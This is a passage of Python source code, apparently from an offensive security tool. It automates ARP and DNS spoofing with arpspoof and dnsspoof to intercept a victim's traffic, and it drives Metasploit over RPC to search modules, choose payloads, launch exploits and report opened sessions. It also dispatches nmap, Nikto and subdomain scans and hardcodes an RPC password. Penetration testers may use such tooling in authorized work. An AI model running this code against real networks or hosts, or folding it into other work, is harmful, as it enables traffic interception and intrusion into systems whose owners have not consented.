        arpspoof_gateway_process = subprocess.Popen(['arpspoof', '-t', gateway_ip, victim_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Start dnsspoof process
        dnsspoof_process = subprocess.Popen(['dnsspoof', '-f', temp_hosts_file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Let it run for 30 seconds
        time.sleep(30)

        # Read the output
        stdout_output = dnsspoof_process.stdout.read()
        stderr_output = dnsspoof_process.stderr.read()

        return {'stdout': stdout_output, 'stderr': stderr_output}

    finally:
        # Terminate processes
        if arpspoof_victim_process:
            os.kill(arpspoof_victim_process.pid, signal.SIGTERM)
        if arpspoof_gateway_process:
            os.kill(arpspoof_gateway_process.pid, signal.SIGTERM)
        if dnsspoof_process:
            os.kill(dnsspoof_process.pid, signal.SIGTERM)

        # Disable IP forwarding
        run_command(['sysctl', '-w', 'net.ipv4.ip_forward=0'])

        # Delete temporary hosts file
        if os.path.exists(temp_hosts_file_path):
            os.remove(temp_hosts_file_path)

def connect_to_metasploit():
    try:
        client = MsfRpcClient('netiv3pass', port=55553, host='127.0.0.1', ssl=False)
        return client
    except Exception as e:
        print(f"Error connecting to Metasploit RPC: {e}")
        return None

def search_metasploit_modules_worker(task_id, query):
    """Worker that searches for Metasploit modules."""
    client = None
    try:
        task = tasks[task_id]
        task['status'] = 'running'
        
        client = connect_to_metasploit()
        if not client:
            raise ConnectionError("Failed to connect to Metasploit RPC. Is msfrpcd running?")

        # The search itself can be slow
        all_exploits = client.call('module.exploits')
        all_auxiliary = client.call('module.auxiliary')
        all_modules = [f"exploit/{m}" for m in all_exploits] + [f"auxiliary/{m}" for m in all_auxiliary]
        print(f"[DEBUG] All Metasploit modules received: {all_modules}") # DEBUG LOG

        if task['status'] == 'cancelled':
            return

        # Filter modules based on query
        filtered_modules = [m for m in all_modules if query.lower() in m.lower()]

        task['status'] = 'completed'
        task['result'] = {'stdout': json.dumps(filtered_modules), 'stderr': None}

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': str(e)}
    finally:
        if client:
            client.logout()
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()

def search_metasploit_modules(query):
    """Starts a background task to search Metasploit modules."""
    return create_task(search_metasploit_modules_worker, query)

def get_metasploit_module_details_worker(task_id, module_fullname):
    """Worker that gets the details of a specific Metasploit module."""
    client = None
    try:
        task = tasks[task_id]
        task['status'] = 'running'

        client = connect_to_metasploit()
        if not client:
            raise ConnectionError("Failed to connect to Metasploit RPC. Is msfrpcd running?")

        module_type = module_fullname.split('/')[0]
        module_name = '/'.join(module_fullname.split('/')[1:])

        # These calls can be slow
        info = client.call('module.info', module_type, module_name)
        if task['status'] == 'cancelled': return
        options = client.call('module.options', module_type, module_name)
        if task['status'] == 'cancelled': return
        
        payloads = []
        if module_type == 'exploit':
            payloads = client.call('module.compatible_payloads', module_type, module_name).get('payloads', [])

        details = {
            "fullname": module_fullname,
            "description": info.get('description', 'N/A'),
            "options": options,
            "payloads": payloads,
            "info": info
        }

        task['status'] = 'completed'
        task['result'] = {'stdout': json.dumps(details, indent=4), 'stderr': None}

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': str(e)}
    finally:
        if client:
            client.logout()
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()

def get_metasploit_module_details(module_fullname):
    """Starts a background task to get Metasploit module details."""
    return create_task(get_metasploit_module_details_worker, module_fullname)

def run_exploit_worker(task_id, module_type, module_name, options):
    """Worker that executes a Metasploit module."""
    client = None
    try:
        task = tasks[task_id]
        task['status'] = 'running'

        client = connect_to_metasploit()
        if not client:
            raise ConnectionError("Failed to connect to Metasploit RPC. Is msfrpcd running?")

        module = client.modules.use(module_type, module_name)
        
        # Separate payload from other options
        payload_name = None
        if 'PAYLOAD' in options:
            payload_name = options.pop('PAYLOAD')

        # Set module options
        for key, value in options.items():
            if value: # Only set options that have a value
                module[key] = value

        task['result'] = {'stdout': f'Running {module_type}/{module_name} with payload {payload_name}...\n', 'stderr': None}
        
        # Get session list before execution
        sessions_before = client.sessions.list.keys()

        # Execute the exploit
        # The `execute` method is blocking, which is why this is in a worker thread.
        exploit_output = module.execute(payload=payload_name)

        if task['status'] == 'cancelled': return

        # Get session list after execution
        sessions_after = client.sessions.list.keys()
        new_sessions = [s for s in sessions_after if s not in sessions_before]

        final_output = f"--- Exploit Output ---\n{exploit_output}\n\n"
        if new_sessions:
            final_output += f"--- SUCCESS ---\nNew session(s) opened: {new_sessions}"
        else:
            final_output += "--- Exploit completed, but no new session was opened. ---"

        task['status'] = 'completed'
        task['result'] = {'stdout': final_output, 'stderr': None}

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': str(e)}
    finally:
        if client:
            client.logout()
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()

def run_exploit(module_fullname, options):
    """Starts a background task to run an exploit."""
    module_type = module_fullname.split('/')[0]
    module_name = '/'.join(module_fullname.split('/')[1:])
    return create_task(run_exploit_worker, module_type, module_name, options)


def run_scan(target, scan_type):
    if scan_type == 'subdomain_enum':
        return run_domain_scan(target, 'subdomain_enum')
    elif scan_type == 'port':
        # Default to quick scan for now, can be expanded later
        return perform_nmap_scan(target, 'quick_scan')
    elif scan_type == 'vulnerability':
        # Default to Nikto scan for now, can be expanded later
        return run_nikto_scan(target)
    elif scan_type == 'ping':
        return perform_ping_scan(target)
    else:
        return {"status": "error", "message": f"Unknown scan type: {scan_type}"}